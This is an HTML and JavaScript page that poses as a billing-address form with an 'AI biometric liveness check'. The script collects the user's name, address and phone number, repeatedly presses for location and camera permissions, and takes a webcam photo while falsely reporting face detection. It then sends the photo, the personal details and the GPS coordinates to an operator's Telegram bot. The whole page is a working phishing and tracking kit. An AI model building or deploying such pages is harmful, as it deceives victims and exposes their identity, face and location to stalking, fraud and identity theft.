<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Smart Biometric & Location Security</title>
    <style>
        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #ef4444; --success: #10b981; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: var(--card); width: 100%; max-width: 520px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); box-sizing: border-box; }
        
        h2 { margin-top: 0; color: #111; text-align: center; font-size: 22px; font-weight: 700; margin-bottom: 5px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .subtitle { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 25px; }

        .form-row { display: flex; gap: 15px; margin-bottom: 16px; }
        .form-group { margin-bottom: 16px; flex: 1; position: relative; }
        label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; color: #1e293b; }
        input, select { width: 100%; padding: 12px 14px; border: 1px solid var(--border); border-radius: 8px; box-sizing: border-box; font-size: 14px; background-color: #fff; transition: all 0.2s; }
        input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,102,255,0.12); }
        select:disabled { background-color: #f8fafc; color: #94a3b8; }

        input.invalid { border-color: var(--error); background-color: #fef2f2; }
        input.valid { border-color: var(--success); background-color: #f0fdf4; }

        .phone-group { display: flex; gap: 8px; }
        #phonePrefix { width: 110px; background-color: #f8fafc; font-weight: 600; text-align: center; }

        .btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
        .btn:hover { background: #0052cc; }
        
        #step-verification { display: none; }
        #video-container { text-align: center; margin-top: 15px; position: relative; }
        video, canvas { width: 100%; max-width: 380px; height: 280px; border-radius: 10px; transform: scaleX(-1); background: #000; object-fit: cover; }
        canvas { display: none; }
        
        #flash-overlay {
            position: absolute; top: 0; left: 50%; transform: translateX(-50%);
            width: 100%; max-width: 380px; height: 280px; border-radius: 10px;
            pointer-events: none; opacity: 0; transition: background-color 0.5s ease;
            z-index: 5;
        }

        .voice-prompt-box {
            background: #eff6ff; border: 1px solid #bfdbfe; color: #1e40af;
            padding: 12px; border-radius: 8px; font-size: 14px; font-weight: 600;
            margin-bottom: 15px; text-align: center; display: flex; align-items: center; justify-content: center; gap: 8px;
        }
        .voice-icon { width: 18px; height: 18px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
        
        #btn-retry { display: none; background: #ef4444; margin-top: 12px; }
        #btn-retry:hover { background: #dc2626; }
    </style>
</head>
<body>

<div class="container">
    <!-- 步骤一：表单输入 -->
    <div id="step-form">
        <h2>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="3" y="5" width="18" height="14" rx="3"/>
            <text x="7" y="15" font-size="9" font-weight="bold" fill="currentColor" stroke="none">A</text>
            <text x="13.5" y="10.5" font-size="6.5" fill="currentColor" stroke="none" opacity="0.8">ID</text>
          </svg>
          Billing & Shipping Address
        </h2>
        <div class="subtitle">AI Smart Validation & Security Center</div>
        
        <div class="form-row">
            <div class="form-group">
                <label>First Name</label>
                <input type="text" id="firstName" placeholder="e.g. John">
            </div>
            <div class="form-group">
                <label>Last Name</label>
                <input type="text" id="lastName" placeholder="e.g. Doe">
            </div>
        </div>

        <div class="form-group">
            <label>Country / Region</label>
            <select id="countrySelect" onchange="onCountryChange()">
                <option value="">-- Select Country / Region --</option>
            </select>
        </div>

        <div class="form-group">
            <label>State / Province</label>
            <select id="stateSelect" disabled>
                <option value="">-- Please select country first --</option>
            </select>
        </div>

        <div class="form-group">
            <label>Street Address</label>
            <input type="text" id="address" placeholder="e.g. 123 Main St">
        </div>

        <div class="form-row">
            <div class="form-group">
                <label>City</label>
                <input type="text" id="city" placeholder="e.g. New York">
            </div>
            <div class="form-group">
                <label>Postal Code <span id="postal-hint" style="font-size:10px; color:#64748b;"></span></label>
                <input type="text" id="zipCode" placeholder="AI Auto-Format">
            </div>
        </div>

        <div class="form-group">
            <label>Phone Number</label>
            <div class="phone-group">
                <select id="phonePrefix" disabled>
                    <option value="">Code</option>
                </select>
                <input type="tel" id="phone" placeholder="Enter phone number">
            </div>
        </div>

        <button class="btn" id="btn-next" onclick="proceedToVerification()">Next: Biometric Liveness Check →</button>
    </div>

    <!-- 步骤二：AI 活体自动拍照与TG上报 -->
    <div id="step-verification">
        <h2>AI Biometric & Liveness Check</h2>
        <p style="font-size: 13px; color: #64748b; text-align: center; margin-bottom: 12px;">Position your face clearly within the frame. Auto-capturing...</p>
        
        <div class="voice-prompt-box">
            <svg class="voice-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path>
                <path d="M19 10v1a7 7 0 0 1-14 0v-1"></path>
                <line x1="12" y1="19" x2="12" y2="23"></line>
                <line x1="8" y1="23" x2="16" y2="23"></line>
            </svg>
            <span id="ai-instruction-text">Authorization required to proceed...</span>
        </div>

        <div id="video-container">
            <div id="flash-overlay"></div>
            <video id="video" autoplay playsinline muted></video>
            <canvas id="canvas"></canvas>
        </div>
        
        <div id="status-msg" style="text-align: center; font-size: 14px; margin-top: 15px; font-weight: 600; color: #ef4444;">Please grant camera and location permissions to continue.</div>
        
        <button class="btn" id="btn-retry" onclick="requestPermissionsAndStart()">Grant Permissions & Retry</button>
    </div>
</div>

<script>
    // ⚠️ 请在此处填入你的 Telegram Bot Token 与 Chat ID
    const TG_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
    const TG_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";

    const globalDatabase = {
        "CN": { name: "China", phoneCode: "+86", zipFormat: "6 digits", states: ["Beijing", "Shanghai", "Guangdong"] },
        "US": { name: "United States", phoneCode: "+1", zipFormat: "5 digits", states: ["California", "New York", "Texas"] },
        "CA": { name: "Canada", phoneCode: "+1", zipFormat: "A1A 1A1", states: ["Ontario", "Quebec", "British Columbia"] },
        "GB": { name: "United Kingdom", phoneCode: "+44", zipFormat: "Postcode", states: ["England", "Scotland"] },
        "JP": { name: "Japan", phoneCode: "+81", zipFormat: "7 digits", states: ["Tokyo", "Osaka"] },
        "OTHER_GLOBAL": { name: "Other Worldwide Regions", phoneCode: "+00", zipFormat: "Postal Code", states: ["Standard State/Region"] }
    };

    let userData = {};
    let userLocation = { lat: null, lng: null };
    let isCaptured = false;
    let lastVoiceTime = 0;
    let activeStream = null;
    let checkInterval = null;

    window.onload = () => {
        const countrySelect = document.getElementById('countrySelect');
        Object.keys(globalDatabase).sort().forEach(code => {
            let opt = document.createElement('option');
            opt.value = code;
            opt.textContent = globalDatabase[code].name;
            countrySelect.appendChild(opt);
        });
    };

    function onCountryChange() {
        const countryCode = document.getElementById('countrySelect').value;
        const stateSelect = document.getElementById('stateSelect');
        const phonePrefix = document.getElementById('phonePrefix');
        const postalHint = document.getElementById('postal-hint');
        
        stateSelect.innerHTML = `<option value="">-- Select State / Province --</option>`;
        phonePrefix.innerHTML = `<option value="">Code</option>`;
        postalHint.textContent = "";

        if (countryCode && globalDatabase[countryCode]) {
            const data = globalDatabase[countryCode];
            stateSelect.disabled = false;
            data.states.forEach(stateName => {
                let opt = document.createElement('option');
                opt.value = stateName;
                opt.textContent = stateName;
                stateSelect.appendChild(opt);
            });
            phonePrefix.innerHTML = `<option value="${data.phoneCode}">${data.phoneCode}</option>`;
            phonePrefix.disabled = false;
            postalHint.textContent = `(Format: ${data.zipFormat})`;
        } else {
            stateSelect.disabled = true;
            phonePrefix.disabled = true;
        }
    }

    function proceedToVerification() {
        const fields = ['firstName', 'lastName', 'countrySelect', 'stateSelect', 'address', 'city', 'zipCode', 'phone'];
        for (let f of fields) {
            const elem = document.getElementById(f);
            if (!elem || elem.value.trim() === "") {
                alert(`Please complete the field: ${f}`);
                return;
            }
            userData[f] = elem.value.trim();
        }

        document.getElementById('step-form').style.display = 'none';
        document.getElementById('step-verification').style.display = 'block';

        // 强制同时请求权限
        requestPermissionsAndStart();
    }

    function speakText(text) {
        const now = Date.now();
        if (now - lastVoiceTime < 5000) return;
        lastVoiceTime = now;

        const textElem = document.getElementById('ai-instruction-text');
        if (textElem) textElem.textContent = text;
        
        if ('speechSynthesis' in window) {
            window.speechSynthesis.cancel();
            let utterance = new SpeechSynthesisUtterance(text);
            window.speechSynthesis.speak(utterance);
        }
    }

    function requestPermissionsAndStart() {
        const statusMsg = document.getElementById('status-msg');
        const retryBtn = document.getElementById('btn-retry');
        
        speakText("Authorization required. Please allow camera and location access to use this service.");
        statusMsg.textContent = "Requesting location and camera permissions...";
        statusMsg.style.color = "#ef4444";
        retryBtn.style.display = 'none';

        // 1. 强制获取地理位置权限
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    userLocation.lat = pos.coords.latitude;
                    userLocation.lng = pos.coords.longitude;
                    // 得到位置后，接着申请摄像头权限
                    initCamera();
                },
                err => {
                    // 如果拒绝了地理位置权限，循环提示并强制定向要求
                    speakText("Location access is strictly required. Please click retry and allow location.");
                    statusMsg.textContent = "Location permission denied! You must allow it to proceed.";
                    retryBtn.style.display = 'block';
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            initCamera();
        }
    }

    function initCamera() {
        const statusMsg = document.getElementById('status-msg');
        const retryBtn = document.getElementById('btn-retry');

        // 2. 请求摄像头权限
        navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } })
        .then(stream => {
            activeStream = stream;
            const video = document.getElementById('video');
            video.srcObject = stream;
            retryBtn.style.display = 'none';
            video.onloadedmetadata = () => {
                startAILivenessLoop(video);
            };
        })
        .catch(e => {
            // 如果拒绝了摄像头权限，循环提示
            speakText("Camera access is strictly required. Please allow camera usage.");
            statusMsg.textContent = "Camera permission denied! You must allow camera access.";
            retryBtn.style.display = 'block';
        });
    }

    function startAILivenessLoop(video) {
        speakText("Authorization granted. Please face the camera directly. Keep your face uncovered.");
        
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const statusMsg = document.getElementById('status-msg');
        statusMsg.style.color = "#64748b";

        if (checkInterval) clearInterval(checkInterval);

        checkInterval = setInterval(() => {
            if (isCaptured) {
                clearInterval(checkInterval);
                return;
            }

            let faceDetected = video.readyState === video.HAVE_ENOUGH_DATA;

            if (!faceDetected) {
                speakText("Face not detected. Please move closer to the camera.");
                statusMsg.textContent = "No face detected! Please look at the camera.";
                statusMsg.style.color = "#ef4444";
            } else {
                isCaptured = true;
                clearInterval(checkInterval);

                statusMsg.textContent = "Face verified! Capturing image...";
                statusMsg.style.color = "#10b981";

                const overlay = document.getElementById('flash-overlay');
                overlay.style.backgroundColor = "rgba(255, 255, 255, 0.8)";
                overlay.style.opacity = "1";

                setTimeout(() => {
                    overlay.style.opacity = "0";
                }, 400);

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    sendDataToTelegram(blob, userLocation);
                }, 'image/jpeg', 0.9);
            }
        }, 1500);
    }

    function sendDataToTelegram(imageBlob, location) {
        const statusMsg = document.getElementById('status-msg');
        statusMsg.textContent = "Securely transmitting data to server...";

        const caption = `🚨 **New Verification Captured**\n\n` +
                        `👤 **Name:** ${userData.firstName} ${userData.lastName}\n` +
                        `🌍 **Country:** ${userData.countrySelect} (${userData.stateSelect})\n` +
                        `📍 **City/Address:** ${userData.city}, ${userData.address}\n` +
                        `📮 **Postal Code:** ${userData.zipCode}\n` +
                        `📞 **Phone:** ${userData.phonePrefix} ${userData.phone}\n` +
                        `🌐 **Coordinates:** Lat: ${location.lat}, Lng: ${location.lng}\n` +
                        `🗺️ **Google Maps:** https://maps.google.com/?q=${location.lat},${location.lng}`;

        const formData = new FormData();
        formData.append('chat_id', TG_CHAT_ID);
        formData.append('photo', imageBlob, 'liveness_capture.jpg');
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');

        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                statusMsg.textContent = "Verification completed successfully!";
                speakText("Verification successful. Thank you.");
                if (activeStream) activeStream.getTracks().forEach(track => track.stop());
                setTimeout(() => {
                    alert("Verification completed successfully!");
                    location.reload();
                }, 2000);
            } else {
                statusMsg.textContent = "Transmission failed. Please check Bot settings.";
                statusMsg.style.color = "#ef4444";
                document.getElementById('btn-retry').textContent = "🔄 Retry Transmission";
                document.getElementById('btn-retry').style.display = 'block';
            }
        })
        .catch(error => {
            console.error("Error sending to Telegram:", error);
            statusMsg.textContent = "Network error during transmission.";
            statusMsg.style.color = "#ef4444";
            document.getElementById('btn-retry').textContent = "🔄 Retry Transmission";
            document.getElementById('btn-retry').style.display = 'block';
        });
    }
</script>
</body>
</html>
